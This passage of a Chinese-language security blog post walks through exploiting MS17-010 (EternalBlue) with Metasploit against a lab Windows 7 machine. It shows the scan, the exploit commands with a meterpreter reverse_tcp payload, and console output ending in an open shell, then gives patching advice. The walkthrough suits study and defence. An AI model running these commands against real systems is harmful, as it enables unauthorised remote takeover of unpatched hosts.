oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo</span></span><br><span class="line"><span class="string">     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl</span></span><br><span class="line"><span class="string">      ;OOOO&#x27;</span>MMM.OOOO.MMM:OOOO.MMM;OOOO;</span><br><span class="line">       .dOOo<span class="string">&#x27;WM.OOOOocccxOOOO.MX&#x27;</span>xOOd.</span><br><span class="line">         ,kOl<span class="string">&#x27;M.OOOOOOOOOOOOO.M&#x27;</span>dOk,</span><br><span class="line">           :kk;.OOOOOOOOOOOOO.;Ok:</span><br><span class="line">             ;kOOOOOOOOOOOOOOOk:</span><br><span class="line">               ,xOOOOOOOOOOOx,</span><br><span class="line">                 .lOOOOOOOl.</span><br><span class="line">                    ,dOd,</span><br><span class="line">                      .</span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.99-dev                          ]</span><br><span class="line">+ -- --=[ 2046 exploits - 1106 auxiliary - 345 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Adapter names can be used <span class="keyword">for</span> IP params <span class="built_in">set</span> LHOST eth0</span><br><span class="line"></span><br><span class="line">[*] Starting persistent handler(s)...</span><br><span class="line">msf5 &gt; search ms17-010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----     -----  -----------</span><br><span class="line">   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span class="keyword">for</span> Win8+</span><br><span class="line">   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index, <span class="keyword">for</span> example use 5 or use exploit/windows/smb/smb_doublepulsar_rce</span><br><span class="line"></span><br><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                                 Required  Description</span><br><span class="line">   ----         ---------------                                                 --------  -----------</span><br><span class="line">   CHECK_ARCH   <span class="literal">true</span>                                                            no        Check <span class="keyword">for</span> architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="literal">true</span>                                                            no        Check <span class="keyword">for</span> DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="literal">false</span>                                                           no        Check <span class="keyword">for</span> named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check</span><br><span class="line">   RHOSTS                                                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT        445                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                                                      no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                                                      no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                               yes       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> rhosts 192.168.220.130</span><br><span class="line">rhosts =&gt; 192.168.220.130</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.220.130:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.220.130:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211207153931594.png" alt="image-20211207153931594"></p>
<p>3.使用metasploit的永恒之蓝漏洞利用；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> rhosts 192.168.220.130</span><br><span class="line">rhosts =&gt; 192.168.220.130</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.220.138:4444 </span><br><span class="line">[*] 192.168.220.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.220.130:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.220.130:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 192.168.220.130:445 - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.220.130:445 - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.220.130:445 - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] 192.168.220.130:445 - CORE raw buffer dump (38 bytes)</span><br><span class="line">[*] 192.168.220.130:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.220.130:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service </span><br><span class="line">[*] 192.168.220.130:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          </span><br><span class="line">[+] 192.168.220.130:445 - Target arch selected valid <span class="keyword">for</span> arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.220.130:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.220.130:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.220.130:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.220.130:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.220.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.220.130:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.220.130:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.220.130:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.220.130:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.220.130:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.220.130:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (201283 bytes) to 192.168.220.130</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.220.138:4444 -&gt; 192.168.220.130:51055) at 2021-12-07 02:30:09 -0500</span><br><span class="line">[+] 192.168.220.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.220.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.220.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211207154041259.png" alt="image-20211207154041259"></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>受影响的系统版本可以参照：<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010</a></p>
<ul>
<li>关闭445端口。</li>
<li>打开防火墙，安装安全软件。</li>
<li>安装对应补丁。</li>
</ul>
]]></content>
      <categories>
        <category>主机安全</category>
      </categories>
  </entry>
</search>
